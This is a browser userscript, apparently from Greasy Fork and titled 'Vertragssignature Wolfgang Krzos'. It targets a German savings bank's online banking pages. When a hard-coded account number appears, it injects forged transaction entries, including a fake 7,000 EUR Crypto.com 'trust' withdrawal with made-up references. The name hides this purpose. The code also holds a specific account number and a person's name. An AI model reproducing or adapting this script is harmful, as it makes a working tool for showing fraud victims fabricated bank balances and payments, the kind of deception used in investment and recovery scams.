// ==UserScript==
// @name         Vertragssignature Wolfgang Krzos
...
// @match        https://www.sms-hm.de/fi/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.sms-hm.de/fi/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sms-hm.de/fi/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @match        https://www.sms-hm.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.sms-hm.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sms-hm.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/466321/Vertragssignature%20Wolfgang%20Krzos.user.js
// @updateURL https://update.greasyfork.org/scripts/466321/Vertragssignature%20Wolfgang%20Krzos.meta.js
// ==/UserScript==
...
(function() {
    ...
    var absender = "Treuhand: Crypto.com MT Limited";
    var absenderTitel = "Treuhand: Crypto.com MT Limited";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A 88000";
    var absenderDetails = "Einreichung einer Treuhand Ueberweisung. Freigabe nötig durch Crypto.com MT Limited";
    var amount = 0;
    var vorgemerkt = "no";
    var xamount = 7000;
    var buchung = 20000;
    var buchungDecimal = "01";
    var buchungTextsZahl = "153.988";
    var accountsecurity = "1802 5646 80";
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 7.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Crypto.com MT Limited">Crypto.com MT Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SM</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">7.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">7.000,00 EUR</span></div></div></div></div></li>';
